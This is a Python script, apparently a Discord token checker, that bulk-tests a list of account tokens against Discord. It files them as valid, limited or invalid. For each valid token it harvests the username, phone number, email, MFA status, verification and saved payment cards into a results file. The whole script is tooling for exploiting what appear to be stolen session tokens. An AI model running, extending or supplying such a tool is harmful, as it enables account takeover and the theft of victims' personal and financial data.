# -*- coding: utf-8 -*-
from os import system
from time import sleep
from colorama import Fore
from threading import Thread
from utils import DiscordAPI

bad: int = 0
good: int = 0
limited: int = 0

class CheckerTokens(object):
    def __init__(self, token) -> str:
        self.token = token

    def checkingTaskToken(self) -> None:
        global bad, good, limited
        discord = DiscordAPI(
            token = self.token
        )

        if discord.getValid() == 401:
            print(f"{Fore.RED}[BAD: {discord.getValid()}] Invalid | {self.token}")
            
            file: str = open("./results/accs-invalid.txt", "a+")
            file.write(self.token + "\n")
            
            bad += 1
            system(f"title Good: {good} Invalid: {bad} Limited: {limited}")

        elif discord.getValid() == 403:
            print(f"{Fore.YELLOW}[LIMITED: {discord.getValid()}] Limited | {self.token}")
            
            file: str = open("./results/accs-limited.txt", "a+")
            file.write(self.token + "\n")
            
            limited += 1
            system(f"title Good: {good} Invalid: {bad} Limited: {limited}")

        else:
            print(f"{Fore.GREEN}[SUCCESS: {discord.getValid()}] Valid | {self.token}")
            
            file: str = open("./results/accs-valid.txt", "a+")
            file.write(self.token + "\n")
            
            good += 1
            system(f"title Good: {good} Invalid: {bad} Limited: {limited}")

            status = discord.getInfoToken()
            if status:
                cards = discord.getCards()
                file: str = open("./results/info-accs-tokens.txt", "a+")
                string = f"{self.token} | username: {status[0]} | phone: {status[1]} | email: {status[2]} | mfa: {status[3]} | verified: {status[4]} | Cards: {cards}\n"
                file.write(string)
            else:
                print(f"Failed to collect information: {self.token}")

if __name__ == '__main__':
    file = open("tokens.txt").read().split("\n")
    for token in file:
        data = CheckerTokens(token)
        Thread_1 = Thread(
            target = data.checkingTaskToken,
            args = ()
        ).start()
        sleep(0.7)
